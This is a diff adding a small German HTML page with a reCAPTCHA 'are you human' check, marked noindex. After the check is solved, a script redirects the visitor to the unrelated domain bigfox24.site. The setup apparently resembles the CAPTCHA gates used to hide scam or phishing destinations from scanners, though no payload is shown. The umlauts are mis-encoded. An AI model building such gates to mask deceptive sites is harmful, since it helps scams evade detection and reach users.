@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>ÃœberprÃ¼fung</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  font-family:system-ui,-apple-system,sans-serif;
+  background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:#fff;
+}
+.container{
+  text-align:center;
+  max-width:400px;
+  width:100%;
+  padding:2rem;
+}
+.captcha-box{
+  background:rgba(255,255,255,0.12);
+  padding:2.5rem;
+  border-radius:16px;
+  box-shadow:0 8px 32px rgba(0,0,0,0.3);
+  backdrop-filter:blur(10px);
+}
+.captcha-box p{
+  font-size:1.45rem;
+  margin-bottom:1.8rem;
+  font-weight:500;
+}
+</style>
+
+<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+</head>
+<body>
+
+<div class="container">
+  <div class="captcha-box">
+    <p>Bitte bestÃ¤tigen Sie, dass Sie ein Mensch sind:</p>
+    <div class="g-recaptcha" 
+         data-sitekey="6Lcr2TksAAAAAG_QomGgPIFY6st-uOH6RAXrKZyr"
+         data-callback="onCaptchaSuccess">
+    </div>
+  </div>
+</div>
+
+<script>
+function onCaptchaSuccess() {
+  // Wird aufgerufen, sobald CAPTCHA gelÃ¶st ist
+  setTimeout(() => {
+    window.location.href = "https://bigfox24.site";
+  }, 1000); // 1 Sekunde Wartezeit fÃ¼r sanften Ãœbergang
+}
+</script>
+
+</body>
+</html>
